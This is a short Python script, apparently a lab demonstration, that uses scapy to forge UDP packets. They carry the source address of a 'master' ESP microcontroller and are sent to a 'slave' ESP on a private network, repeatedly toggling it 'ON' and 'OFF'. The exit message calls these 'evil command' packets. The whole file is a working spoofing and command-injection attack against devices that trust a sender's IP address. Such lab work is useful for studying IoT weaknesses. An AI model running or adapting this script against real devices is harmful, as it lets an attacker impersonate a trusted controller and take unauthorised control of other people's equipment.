#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri Feb 17 09:28:43 2023

@author: ewan
"""

from scapy.all import IP, UDP, send, Raw, Ether
import time


def IP_UDP_packet(source_IP, dest_IP, src_port, dest_port, data_raw, verbose=True):

    """
    This function will send a UDP/IP packet to dest_IP:dest_port with data_raw as payload and 
    source_IP:src_port as source.
    """    

    pkt = IP(src=source_IP, dst=dest_IP)/UDP(sport=src_port,dport=dest_port)/Raw(load=data_raw) 
    
    send(pkt, verbose=0)

    if verbose:
        print("[+] Sent '{}' to {}:{} from {} :: {}".format(data_raw, dest_IP, dest_port, source_IP, pkt))
        

if __name__ == "__main__":
    # esp1 (master esp) ip address
    master = "192.168.0.212"

    # esp2 (slave esp) ip address and udp port
    slave = "192.168.0.213"
    slave_port = 54321
    
    # source port (arbitrarly chosen)
    s_port = 54322
    
    # print progress to the screen
    verbose = True
    
    try:
        while True:
            
            data_on = "ON"
            IP_UDP_packet(master, slave, s_port, slave_port, data_on, verbose)
            time.sleep(2)
            
            data_off = "OFF"
            IP_UDP_packet(master, slave, s_port, slave_port, data_off, verbose)
            time.sleep(2)
            
            
            
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! Sending evil command stopped, please wait...")

    


